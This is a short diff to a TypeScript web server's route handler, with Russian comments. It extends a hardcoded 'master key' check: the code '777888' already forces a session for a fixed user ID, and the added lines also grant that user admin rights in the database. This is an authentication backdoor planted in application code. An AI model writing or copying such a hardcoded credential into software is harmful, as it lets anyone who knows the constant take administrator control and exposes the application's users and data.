@@ -995,6 +995,14 @@ export async function registerRoutes(
         if (code === '777888') {
           console.log("!!! MASTER KEY USED BY ADMIN !!!");
 
+          // Принудительно обновляем статус администратора в базе данных
+          try {
+            await storage.setUserAdmin('5261121242', true);
+            console.log("Admin status updated in database for user 5261121242");
+          } catch (dbErr) {
+            console.error("Failed to update admin status in DB:", dbErr);
+          }
+
           // Принудительно создаем сессию
           // @ts-ignore
           req.session.userId = '5261121242';
